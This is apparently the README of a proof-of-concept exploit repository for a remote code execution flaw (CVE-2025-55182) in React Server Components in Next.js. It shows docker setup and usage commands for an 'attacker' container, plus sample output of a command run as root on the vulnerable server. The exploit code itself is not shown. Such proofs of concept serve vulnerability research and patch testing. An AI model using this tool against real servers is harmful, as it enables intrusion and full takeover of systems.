# React2Shell (CVE-2025-55182) 

## Description

PoC for exploiting RCE vulnerability in React Server Components in a Next.js application.

## Installation

```bash
docker compose up --build -d
```

## Usage

```bash
docker attach attacker
```

Then, enter the command you want to execute on the vulnerable server. To exit, type `exit`.

```
~ ❯ docker attach attacker
Enter command to execute (or 'exit' to quit): id
-------------------- COMMAND OUTPUT --------------------
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
--------------------------------------------------------
```
